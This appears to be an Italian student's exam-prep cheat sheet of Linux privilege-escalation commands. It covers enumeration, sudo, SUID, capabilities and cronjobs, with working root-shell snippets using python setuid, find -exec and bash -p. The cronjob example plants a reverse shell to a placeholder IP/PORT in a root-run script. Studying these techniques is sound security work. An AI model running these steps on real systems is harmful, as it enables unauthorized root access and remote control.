## 1. Informazioni sul sistema
```
uname -a
```
**Cosa fa:**  
Mostra info complete sul sistema (kernel, architettura, hostname).

**Quando usarlo:**  
Subito, per capire su che macchina sei (Linux version, kernel → utile per exploit).

---

```
cat /etc/os-release
```
**Cosa fa:**  
Mostra distribuzione e versione (Ubuntu, Debian, ecc.).

**Quando usarlo:**  
Per cercare exploit specifici per quella distro/versione.


---

## 2. Utenti e accessi
```
cat /etc/passwd
```
**Cosa fa:**  
Lista tutti gli utenti del sistema.

**Cosa guardare:**
- utenti con `/bin/bash` → login attivo

**Quando usarlo:**  
Per capire:
- quali utenti esistono
- quali sono “interessanti” (admin, servizi, ecc.)

---

```
su NOME_UTENTE
```
**Cosa fa:**  
Passa a un altro utente.

**Quando usarlo:**  
Se hai password o accesso già ottenuto.


---

## 3. Privilegi e sudo
```
sudo -l
```
**Cosa fa:**  
Mostra i comandi eseguibili con sudo.

**IMPORTANTE:**  
È uno dei primi comandi da fare.

**Quando usarlo:**  
Per privilege escalation → se puoi eseguire qualcosa come root.

---

```
sudo -u UTENTE comando
```
oppure
```
sudo -u UTENTE /path/comando /path/file
```

**Cosa fa:**  
Esegue un comando come un altro utente.

**Note:**
- file → path assoluto obbligatorio
- comando -> alcune volte anche relativo (es. python posso scriverlo direttamente come `python3`)

**Quando usarlo:**  
Per eseguire comandi impersonando un altro utente


---

## 4. Permessi sui file
```
ls -la
```
oppure
```
ls -la /path/file
```

**Cosa fa:**  
Mostra permessi, owner e gruppo.

**Quando usarlo:**  
Per vedere se puoi:
- leggere
- scrivere
- eseguire

---

```
chmod a+x file
```
**Cosa fa:**  
Rende un file eseguibile.

**Quando usarlo:**  
Se vuoi eseguire uno script trovato.

✔️ Funziona se:
- sei **owner del file**
- oppure hai permessi di scrittura su quel file
- oppure sei root

---

```
nano file
```
**Cosa fa:**  
Modifica file.

**Quando usarlo:**  
Se il file è scrivibile → possibile escalation.


---

## 5. Capabilities (molto importante)
```
getcap -r / 2>/dev/null
```
**Cosa fa:**  
- cerca in tutto il sistema (`/`)
- file con capabilities
- nasconde errori (`2>/dev/null`)

**Perché è importante:**  
Guarda questo:
```
cap_setuid
```
👉 significa: può cambiare utente
Se quel binario lo puoi eseguire → puoi fare escalation


**Quando usarlo:**  
Subito dopo:
1. `sudo -l`
2. SUID (`find / -perm -u=s ...` VEDI DOPO)
3. **capabilities**
👉 è uno dei check standard


**Esempio**
Se trovi tipo:
```
/usr/bin/python3 = cap_setuid+ep
```
puoi fare:
```python
import os  
os.setuid(0)  
os.system("/bin/bash")
```
👉 boom → shell root


---

## 6. SUID (privilege escalation classico)
```
find / -perm -u=s -type f 2>/dev/null
```
**Cosa fa:**  
- cerca file (`-type f`)
- con SUID attivo (`-perm -u=s`)
- da root `/`
- nasconde errori

**Perché è importante:**  
Questi file girano con privilegi del proprietario (spesso root).
Perché:
👉 se trovi un file SUID vulnerabile  
👉 puoi diventare root

**Quando usarlo**
Sempre nella fase iniziale:
1. `sudo -l`
2. SUID
3. capabilities
4. cronjob

**Esempio reale**
Se trovi:
```
/usr/bin/find
```
con SUID
puoi fare:
```
find . -exec /bin/bash \; -quit
```
👉 ottieni una shell con i privilegi del proprietario (spesso root)


---

## 7. Cronjob
```
crontab -l
```
**Cosa fa:**  
Mostra i cronjob dell’utente corrente.

**Quando usarlo:**  
Per vedere script eseguiti automaticamente → possibile escalation.

**Perché usarlo**
👉 i cronjob spesso girano come **root**  
👉 ma usano script modificabili

**Esempio**
1. trovi un cronjob:
```
* * * * * root /tmp/backup.sh
```

2. controlli i permessi:
```
ls -la /tmp/backup.sh
```

3. se è scrivibile:
	👉 lo modifichi:
```
echo "bash -i >& /dev/tcp/IP/PORT 0>&1" > /tmp/backup.sh
```

4. aspetti che venga eseguito
	👉 ottieni shell root


**Attenzione**
`crontab -l` mostra solo:
- cron dell’utente

👉 ma esistono anche:
- `/etc/crontab`
- `/etc/cron.d/`
- `/var/spool/cron/`


---

## 8. Strings (analisi file)
```
strings file
```
**Cosa fa:**  
Estrae stringhe leggibili da un file binario.

**Quando usarlo:**  
Per trovare:
- password
- path
- comandi nascosti


---

## 9. Bash da altri contesti

### Python shell escape
```python
import os
os.system('/bin/bash')
```
**Cosa fa:**  
Apre una shell bash da Python.

**Quando usarlo:**  
Se hai accesso a un interpreter Python limitato.


---

### Bash con privilegi mantenuti
```
/path/bash -p
```
**Cosa fa:**  
Avvia bash mantenendo privilegi (es. SUID).

**`-p`**
👉 `-p` = **preserve privileges**
Significa:
- **NON abbassa i privilegi**
- mantiene quelli del processo padre

**Senza `-p`**
Se esegui:
```
/bin/bash
```
👉 bash per sicurezza:
- **abbassa i privilegi**
- passa all’utente reale (tu)
➡️ perdi eventuale root/SUID

**Quando usarlo:**  
In exploit su binari vulnerabili.


---

## 10. Note operative (importanti per esame)
### Sequenza tipica:
1. info sistema
2. utenti
3. `sudo -l`
4. SUID / capabilities
5. cronjob
6. analisi file
